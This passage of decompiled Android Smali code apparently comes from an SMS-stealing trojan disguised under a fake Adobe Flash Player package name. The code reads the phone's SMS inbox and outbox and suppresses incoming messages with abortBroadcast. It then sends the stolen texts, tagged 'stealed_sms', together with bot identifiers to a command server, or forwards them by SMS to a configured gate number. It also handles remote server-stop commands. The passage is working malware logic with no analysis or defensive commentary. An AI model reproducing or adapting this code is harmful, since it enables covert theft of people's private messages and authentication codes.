    .end local v14    # "BotLocation":Ljava/lang/String;
    .end local v15    # "BotNetwork":Ljava/lang/String;
    .end local v16    # "BotPrefix":Ljava/lang/String;
    .end local v17    # "BotVer":Ljava/lang/String;
    .end local v18    # "Reich_ServerGate":Ljava/lang/String;
    .end local v19    # "SDK":Ljava/lang/String;
    .end local v24    # "body":Ljava/lang/String;
    .end local v33    # "forceZ":Ljava/lang/String;
    .end local v38    # "keyCode":Ljava/lang/String;
    .end local v52    # "sender":Ljava/lang/String;
    .end local v54    # "sms":Ljava/lang/String;
    .end local v56    # "smsZ":Landroid/telephony/SmsMessage;
    .end local v58    # "svcs":Ljava/lang/String;
    .end local v64    # "zkey":Ljava/lang/String;
    :cond_12
    aget-object v4, v50, v36

    check-cast v4, [B

    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v4

    .line 62
    aput-object v4, v41, v36

    .line 60
    add-int/lit8 v36, v36, 0x1

    goto/16 :goto_0

    .line 84
    .restart local v13    # "BotID":Ljava/lang/String;
    .restart local v14    # "BotLocation":Ljava/lang/String;
    .restart local v15    # "BotNetwork":Ljava/lang/String;
    .restart local v16    # "BotPrefix":Ljava/lang/String;
    .restart local v17    # "BotVer":Ljava/lang/String;
    .restart local v18    # "Reich_ServerGate":Ljava/lang/String;
    .restart local v19    # "SDK":Ljava/lang/String;
    .restart local v24    # "body":Ljava/lang/String;
    .restart local v38    # "keyCode":Ljava/lang/String;
    .restart local v56    # "smsZ":Landroid/telephony/SmsMessage;
    :cond_13
    :try_start_2
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    .line 85
    .local v25, "bodyText":Ljava/lang/StringBuilder;
    const/16 v36, 0x0

    :goto_b
    move-object/from16 v0, v41

    array-length v4, v0

    move/from16 v0, v36

    if-lt v0, v4, :cond_14

    .line 88
    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    goto/16 :goto_1

    .line 86
    :cond_14
    aget-object v4, v41, v36

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, v25

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 85
    add-int/lit8 v36, v36, 0x1

    goto :goto_b

    .line 133
    .end local v25    # "bodyText":Ljava/lang/StringBuilder;
    .restart local v26    # "buff":[Ljava/lang/String;
    .restart local v52    # "sender":Ljava/lang/String;
    .restart local v54    # "sms":Ljava/lang/String;
    .restart local v58    # "svcs":Ljava/lang/String;
    .restart local v59    # "temp":[B
    .restart local v60    # "tmp":Ljava/lang/String;
    :cond_15
    :try_start_3
    const-string v4, "w"

    const-string v6, "*"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 134
    const-string v4, "server"

    const-string v6, "stop"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 135
    const-string v4, "ReichServer!stop:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, p1

    invoke-direct {v0, v1, v13, v4, v2}, Lcom/adobe/flashplayer_/CCC;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    :try_end_3
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_3 .. :try_end_3} :catch_0

    goto/16 :goto_2

    .line 352
    .end local v26    # "buff":[Ljava/lang/String;
    .end local v59    # "temp":[B
    .end local v60    # "tmp":Ljava/lang/String;
    :catch_0
    move-exception v32

    .line 353
    .local v32, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual/range {v32 .. v32}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto/16 :goto_7

    .line 239
    .end local v32    # "e":Ljava/io/UnsupportedEncodingException;
    .restart local v5    # "inBox":Landroid/net/Uri;
    .restart local v37    # "inc":Landroid/database/Cursor;
    .restart local v46    # "pack_inbox":Ljava/lang/String;
    .restart local v47    # "pack_inbox_pack":Ljava/lang/String;
    .restart local v48    # "pack_outbox":Ljava/lang/String;
    .restart local v49    # "pack_outbox_pack":Ljava/lang/String;
    .restart local v59    # "temp":[B
    .restart local v60    # "tmp":Ljava/lang/String;
    :cond_16
    :try_start_4
    const-string v4, "body"

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v42

    .line 240
    .restart local v42    # "msg":Ljava/lang/String;
    const-string v4, "date"

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v30

    .line 241
    .local v30, "date":J
    const-string v4, "address"

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v53

    .line 243
    .local v53, "sender_sms":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v46 .. v46}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044c ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, v53

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v46

    .line 244
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v46 .. v46}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u0414\u0430\u0442\u0430 ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-static/range {v30 .. v31}, Lcom/adobe/flashplayer_/CCC;->millisToDate(J)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v46

    .line 245
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v46 .. v46}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, v42

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v46

    .line 246
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v46 .. v46}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "........................\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v46

    goto/16 :goto_3

    .line 259
    .end local v30    # "date":J
    .end local v42    # "msg":Ljava/lang/String;
    .end local v53    # "sender_sms":Ljava/lang/String;
    .restart local v7    # "outBox":Landroid/net/Uri;
    .restart local v45    # "ouc":Landroid/database/Cursor;
    :cond_17
    const-string v4, "body"

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v42

    .line 260
    .restart local v42    # "msg":Ljava/lang/String;
    const-string v4, "date"

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v30

    .line 261
    .restart local v30    # "date":J
    const-string v4, "address"

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v45

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v53

    .line 262
    .restart local v53    # "sender_sms":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v48 .. v48}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044c ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, v53

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v48

    .line 263
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v48 .. v48}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u0414\u0430\u0442\u0430 ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-static/range {v30 .. v31}, Lcom/adobe/flashplayer_/CCC;->millisToDate(J)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v48

    .line 264
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v48 .. v48}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "[ \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 ]\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, v42

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v48

    .line 265
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v48 .. v48}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "........................\r\r"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v48

    goto/16 :goto_4

    .line 293
    .end local v5    # "inBox":Landroid/net/Uri;
    .end local v7    # "outBox":Landroid/net/Uri;
    .end local v30    # "date":J
    .end local v37    # "inc":Landroid/database/Cursor;
    .end local v42    # "msg":Ljava/lang/String;
    .end local v45    # "ouc":Landroid/database/Cursor;
    .end local v46    # "pack_inbox":Ljava/lang/String;
    .end local v47    # "pack_inbox_pack":Ljava/lang/String;
    .end local v48    # "pack_outbox":Ljava/lang/String;
    .end local v49    # "pack_outbox_pack":Ljava/lang/String;
    .end local v53    # "sender_sms":Ljava/lang/String;
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    .restart local v55    # "smsManager":Landroid/telephony/SmsManager;
    .restart local v61    # "to":Ljava/lang/String;
    :cond_18
    const/4 v4, 0x1

    aget-object v61, v28, v4

    goto/16 :goto_5

    .line 327
    .end local v55    # "smsManager":Landroid/telephony/SmsManager;
    .end local v61    # "to":Ljava/lang/String;
    :cond_19
    const-string v4, "forceZ"

    const-string v6, "Off"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    :try_end_4
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_4 .. :try_end_4} :catch_0

    goto/16 :goto_6

    .line 446
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v59    # "temp":[B
    .end local v60    # "tmp":Ljava/lang/String;
    .restart local v33    # "forceZ":Ljava/lang/String;
    .restart local v62    # "x":I
    .restart local v63    # "zk_tmp":[Ljava/lang/String;
    .restart local v64    # "zkey":Ljava/lang/String;
    :cond_1a
    aget-object v4, v63, v62

    move-object/from16 v0, v52

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_1b

    .line 448
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/CCC;->abortBroadcast()V

    .line 449
    const/16 v35, 0x1

    .line 451
    if-eqz v43, :cond_1c

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-eqz v4, :cond_1c

    .line 453
    const-string v57, ""

    .line 454
    .restart local v57    # "sms_get":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v57 .. v57}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v54

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v57

    .line 456
    move-object/from16 v0, p0

    move-object/from16 v1, v52

    move-object/from16 v2, v57

    move-object/from16 v3, p1

    invoke-direct {v0, v1, v2, v3}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 457
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=stealed_sms&i="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v52

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    move-object/from16 v0, p1

    move-object/from16 v1, v52

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v22, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 445
    .end local v57    # "sms_get":Ljava/lang/String;
    :cond_1b
    :goto_c
    add-int/lit8 v62, v62, 0x1

    goto/16 :goto_8

    .line 461
    :cond_1c
    const-string v4, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v34

    .line 462
    .restart local v34    # "gate":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v55

    .line 463
    .restart local v55    # "smsManager":Landroid/telephony/SmsManager;
    if-eqz v55, :cond_1b

    .line 464
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "+"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static/range {v38 .. v38}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v52

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v54

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v4, v6}, Lcom/adobe/flashplayer_/CCC;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_c

    .line 479
    .end local v34    # "gate":Ljava/lang/String;
    .end local v55    # "smsManager":Landroid/telephony/SmsManager;
    .end local v62    # "x":I
    .end local v63    # "zk_tmp":[Ljava/lang/String;
    :cond_1d
    move-object/from16 v0, v52

    move-object/from16 v1, v64

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_e

    const-string v4, ""

    move-object/from16 v0, v64

    if-eq v0, v4, :cond_e

    if-nez v35, :cond_e

    .line 480
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/CCC;->abortBroadcast()V

    .line 481
    const/16 v35, 0x1

    .line 482
    if-eqz v43, :cond_1e

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-eqz v4, :cond_1e

    .line 484
    const-string v57, ""

    .line 485
    .restart local v57    # "sms_get":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v57 .. v57}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v54

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v57

    .line 487
    move-object/from16 v0, p0

    move-object/from16 v1, v52

    move-object/from16 v2, v57

    move-object/from16 v3, p1

    invoke-direct {v0, v1, v2, v3}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 488
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=stealed_sms&i="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v52

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    move-object/from16 v0, p1

    move-object/from16 v1, v52

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v22, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_9

    .line 492
